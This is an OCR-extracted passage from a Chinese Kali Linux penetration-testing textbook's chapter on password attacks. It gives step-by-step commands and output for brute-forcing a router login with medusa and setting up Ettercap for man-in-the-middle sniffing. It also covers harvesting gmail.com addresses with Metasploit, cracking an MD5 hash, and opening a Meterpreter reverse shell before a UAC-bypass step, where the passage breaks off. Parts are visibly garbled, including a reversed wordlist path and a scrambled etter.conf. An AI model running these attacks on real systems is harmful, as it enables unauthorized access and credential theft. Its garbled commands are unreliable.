[X3] -
: Username to test
-U [FILE]
: File containing usernames to test
] -
: Password to test
-P [FILE]
: File containing passwords to test
-C [FILE]
: File containing combo entries. See README for more information.
-O [FILE]
: File to append log information to
· 243 ·
---
## Page 256
第3篇各种渗透测试
-e [n/s/ns]
: Additional password checks ([n] No Password, [s] Password = Usermame)
: Name of the module to execute (without the .mod extension)
[] -
: Parameter to pass to the module. This can be passed multiple times with a
different parameter each time and they will all be sent to the module (i.e.
-m Param1 -m Param2, etc.)
-d
: Dump all known modules
-n [NUM]
 : Use for non-default TCP port number
S-
: Enable SSL
-g [NUM]
 : Give up after trying to connect for NUM seconds (default 3)
-r [NUM]
: Sleep NUM seconds between retry attempts (default 3)
-R [NUM]
:Attempt NuM retries before giving up. The total number of attempts will be
NUM + 1.
-t [NUM]
: Total number of logins to be tested concurrently
-T [NUM]
: Total number of hosts to be tested concurrently
-L
 : Parallelize logins using one username per thread. The default is to process
the entire username before proceeding.
-f
 : Stop scanning host after first valid username/password found
-F
-b
: Suppress startup banner
q
: Display module's usage information
-v [NUM]
: Verbose level [0 - 6 (more)]
-w [NUM]
: Error debug level [0 - 10 (more)]
-V
: Display version
-Z[TEXT]
:Resume scan based on map of previous scan
以上输出的信息显示了medusa命令的帮助信息。包括meduas命令的语法、可使用的
选项及参数。用户可以根据自已的需要，选择相应的选项获取路由器的访问权。下面看一
个例子的运行结果。
【实例8-1】使用medusa暴力破解地址为192.168.5.1的路由器，执行命令如下所示：
root@kali:~# medusa -h 192.168.5.1 -u admin -P /usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-
- 0g su a- dnu - xiuuof/spmssed/pmssed
Medusa v2.0 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks 
ACCOUNT CHECK: [http] Host: 192.168.5.1 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete)
Password:(1of 3109 complete)
ACCOUNT CHECK: [http] Host: 192.168.5.1 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete)
Password: admin (2 of 3109 complete)
ACCOUNT CHECK: [http] Host: 192.168.5.1 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete)
Password: 12345 (3 of 3109 complete)
ACCOUNT CHECK: [http] Host: 192.168.5.1 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete)
Password: abc123 (4 of 3109 complete)
ACCOUNT CHECK: [http] Host: 192.168.5.1 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete)
Password:password (5 of3109 complete)
ACCOUNT CHECK: [http] Host: 192.168.5.1 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete)
Password: computer (6 of 3109 complete)
ACCOUNT CHECK: [http] Host: 192.168.5.1 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete)
Password: 123456 (7 of 3109 complete)
ACCOUNT CHECK: [http] Host: 192.168.5.1 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete)
Password: huolong5 (8 of 3109 complete)
ACCOUNT FOUND: [http] Host: 192.168.5.1 User: admin Password: daxueba [SUCCESS]
以上输出的信息是破解路由器密码的一个过程。一般路由器默认的用户名和密码都是
admin。但是通常，用户会将密码进行修改。所以这里指定一个密码字典john.txt，通过该
· 244 *
---
## Page 257
第8章密码攻击
字典对路由器进行暴力破解。从最后一行输出的信息，可以看到路由器的用户名和密码分
别为admin和daxueba。
8.2分析密码
在实现密码破解之前，介绍一下如何分析密码。分析密码的目的是，通过从目标系统、
组织中收集信息来获得一个较小的密码字典。本节将介绍使用Etercap工具或
MSFCONSOLE来分析密码。
8.2.1Ettercap工具
Ettercap是Linux下一个强大的欺骗工具，也适用于Windows。用户能够使用Ettercap
工具快速地创建伪造的包，实现从网络适配器到应用软件各种级别的包，绑定监听数据到
一个本地端口等。下面将介绍Ettercap工具的使用。
使用Ettercap分析密码的具体操作步骤如下所示。
（1）配置Ettercap的配置文件etter.conf。首先使用locate命令查找到Ettercap配置文
件保存的位置。执行命令如下所示：
root@kali:~# locate etter.conf
/etc/ettercap/etter.conf
/usr/share/man/man5/etter.conf.5.gz
从以上输出信息中，可以看到Ettercap配置文件etter.conf保存在/etc/ettercap/中。
（2）使用VIM编辑etter.conf配置文件。将该文件中ec_uid和ec_gid配置项值修改为
0，并将Linux部分附近IPTABLES行的注释去掉。修改结果如下所示：
root@kali:~#vi /etc/ettercap/etter.conf
[ssud]
0=pinoe
# nobody is the default
0=p6
# nobody is the default
#
Linux
#-
# if you use iptables:
REDIRECT --to-port %rport
REDIRECT --to-port %rport”
（3）启动Ettercap。使用Ettercap命令的-G选项，启动图形界面。执行命令如下所示：
root@kali:~#ettercap-G
执行以上命令后，将显示如图8.6所示的界面。
（4）通过使用中间人攻击的方式，收集目标系统上的各种重要信息。通过这些信息来
构建可能的密码字典。关于使用Ettercap实现中间人攻击，在第7章已详细介绍，这里不
再资述。
· 245 ·
---
## Page 258
第3篇各种渗透测试
ettercap 0.8.0
-ox
File Sniff Option
Ettercap
图8.6Ettercap 初始界面
8.2.2使用MSFCONSOLE分析密码
使用Metasploit MSFCONSOLE的search_email_collector模块分析密码。通过该模块可
以搜集一个组织相关的各种邮件信息。这些邮件信息有助于构建用户字典。具体操作步骤
如下所示。
（1）使用MSFCONSOLE。执行命令如下所示：
root@kali:~#msfconsole
msf >
（2）查询search_emailcollector模块。执行命令如下所示：
msf >search email collector
[!] Database not connected or cache not built, using slow search
Matching Modules
Name
Disclosure Date
Rank
Description
auxiliary/gather/search_email_collector normal Search Engine Domain Email Address Collector
msf >
执行以上命令后，在输出结果中看到以上信息，就表示存在search_email_collector
模块。
（3）使用辅助模块search_email_collector。执行命令如下所示：
msf>use auxiliary/gather/search_email_collector
msf auxiliary(search_email_collector) >
输出的信息表示，已切换到scarch_cmail_collcctor模块。
· 246 ·
---
## Page 259
第8章密码攻击
（4）查看search_email_collector模块下有效的选项。执行命令如下所示：
msf auxiliary(search_email_collector) > show options
Module options (auxiliary/gather/search_email_collector):
Name
Current Setting
Required
Description
DOMAIN
yes
The domain name to locate email addresses for
OUTFILE
no
A filename to store the generated email list
SEARCH_BING
true
yes
Enable Bing as a backend search engine
SEARCH_GOOGLE
true
yes
Enable Google as a backend search engine
SEARCH_YAHOO
true
yes
EnableYahoo! as a backend search engine
输出的信息显示了search_email_collector模块中有效的配置选项，根据用户自己的情
况配置相应的选项。
（5）下面分别配置DOMAIN和OUTFILE选项，如下所示：
msf auxiliary(search_email_collector) > set DOMAIN gmail.com
domain => gmail.com
msf auxiliary(search_email_collector) > set outfile /root/Desktop/fromwillie.txt
outfile =>/root/Desktop/fromwillie.txt
（6）启动渗透攻击。执行命令如下所示：
msf auxiliary(search_email_collector) > run
[*] Harvesting emails ...
[] Searching Google for email addresses from gmall.com
[*] Extracting emails from Google search results..
[*] Searching Bing email addresses from gmail.com
[*] Extracting emails from Bing search results...
学社
[*]SearchingYahoo for email addresses from gmail.com
[?]
PI:EMAIL
[?]
PI:EMAIL
[*]
PI:EMAIL
[*]
PI:EMAIL
[*]
PI:EMAIL
[*]
PI:EMAIL
[?]
PI:EMAIL
[?]
PI:EMAIL
[·]
taylorhansson@ gmail.com
[▪]
PI:EMAIL
[?]
PI:EMAIL
[*]
PI:EMAIL
[*]
PI:EMAIL
PI:EMAIL
[?]
PI:EMAIL
[?]
PI:EMAIL
[?]
PI:EMAIL
[?]
PI:EMAIL
[]
PI:EMAIL
[*] Writing email address list to /root/Desktop/fromwillie.txt...
[*] Auxiliary module execution completed
输出的信息显示了所有gmail.cm的邮箱地址，并且将所有信息保存在fromwillie.txt
· 247 ·
---
## Page 260
第3篇各种渗透测试
文件中。此时用户可以根据收集到的邮箱用户信息，猜测它的密码。
8.2.3哈希值识别工具HashIdentifier
哈希值是使用HASH算法通过逻辑运算得到的数值。不同的内容使用HASH算法运算
后，得到的哈希值不同。下面将介绍使用HashIdentifier工具识别哈希值的加密方式。
（1）启动hash-identifier命令。在图形界面依次选择“应用程序”KaliLinux“密码攻
击”“离线攻击”hash-identifier命令，将显示如下所示的信息：
#v
#
#八\
#111_11
VAVIIMI
#
#\
#
#
_
#
#
#
#
NNNNN
V_N_/
/v1.1#
#
By Zion3R #
#
www.Blackploit.com #
#
PI:EMAIL #
HASH:
从输出的信息中看到HASH：提示符，就表示成功打开了hash-identifier命令的终端。
此时，攻击时就有LM加密的哈希值。
（2）攻击6bcec2ba2597f089189735afeaa300d4哈希值。执行命令如下所示：
HASH:6bcec2ba2597f089189735afeaa300d4
Possible Hashs:
[+]MD5
[+]Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($usemame)))
Least Possible Hashs:
[+]RAdmin v2.x
[+]NTLM
[+]MD4
[+]MD2
[+]MD5(HMAC)
[+]MD4(HMAC)
从输出的信息中，可以看到6bcec2ba2597f089189735afeaa300d4哈希值可能是使用
MD5加密的。
8.3破解LMHashes密码
）
Windows2000、XP、Vista和Windows7中使用了更先进的NTLMv2之前，这是唯一可用
的版本。这些新的操作系统虽然可以支持使用LM哈希，但主要是为了提供向后兼容性。
· 248 *
---
## Page 261
第8章密码攻击
不过在WindowsVista和Windows7中，该算法默认是被禁用的。本节将介绍如何破解LM
Hashes密码。
在KaliLinux中，可以使用findmyhash工具破解LMHashes密码。其中，findmyhash
命令的语法格式如下所示：
findmyhash -h hash
以上语法中，各个选项含义如下所示。
口Encryption：指定使用的哈希加密类型。
口-h：指定要破解的LM哈希值。
【实例8-2】使用findmyhash命令攻击LMHashes密码。执行命令如下所示：
root@kali:~# findmyhash MD5-h 5f4dcc3b5aa765d61d8327deb882cf99
Cracking hash: 5f4dcc3b5aa765d61d8327deb882cf99
Analyzing with md5hood (http://md5hood.com)...
... hash not found in md5hood
Analyzing with stringfunction (http://www.stringfunction.com)...
... hash not found in stringfunction
Analyzing with 99k.org (http://xanadrel.99k.org)
... hash not found in 99k.org
Analyzing with sans (http://isc.sans.edu)..
... hash not found in sans
Analyzing with bokehman (http://bokehman.com)...
... hash not found in bokehman
Analyzing with goog.li (http://goog.li)...
... hash not found in goog.li
Analyzing with schwett (http://schwett.com)...
... hash not found in schwett
Analyzing with netmd5crack(http://www..netmd5crack.com).↓]
... hash not found in netmd5crack
Analyzing with md5-cracker (http://www.md5-cracker.tk)...
... hash not found in md5-cracker
Analyzing with benramsey (http://tools.benramsey.com)...
... hash not found in benramsey
Analyzing with gromweb (http://md5.gromweb.com).
***** HASH CRACKED!! *****
The original string is: password
The following hashes were cracked:
5f4dcc3b5aa765d61d8327deb882cf99 ->password
以上输出的信息是攻击LMHashes密码的过程。经过一番的攻击，最后获取到哈希值
5f4dcc3b5aa765d61d8327deb882cf99的原始密码是password。
如果觉得破解LMHashes太慢的话，可以使用Metasploit中的psexec模块绕过Hash
值。下面将介绍使用psexec模块绕过Hash值的方法。
（1）通过在目标主机（Windows7）上运行Veil创建的可执行文件backup.exe，成功
获取一个活跃的远程会话，如下所示：
[*] Started reverse handler on 192.168.6.103:4444
[*] Starting the payload handler...
[*] Sending stage (769536 bytes) to 192.168.6.106
[*] Meterpreter session 1 opened (192.168.6.103:4444 -> 192.168.6.106:49160) at 2014-07-22
15:29:55 +0800
从以上信息中，可以看到成功打开了会话1。
·249 ·
---
## Page 262
第3篇各种渗透测试
（2）查看用户权限信息。执行命令如下所示：
meterpreter > getuid
Server usemame: WIN-RKPKQFBLG6C\yw
从输出的信息中，可以看到该用户的权限是一个普通权限。接下来，使用bypassuac
模块绕过UAC。
（3）设置lyw用户绕过UAC。执行命令如下所示：
meterpreter >background
[*] Backgrounding session 1...
msf exploit(handler) > use exploit/windows/local/bypassuac
msf exploit(bypassuac) > set session 1
session => 1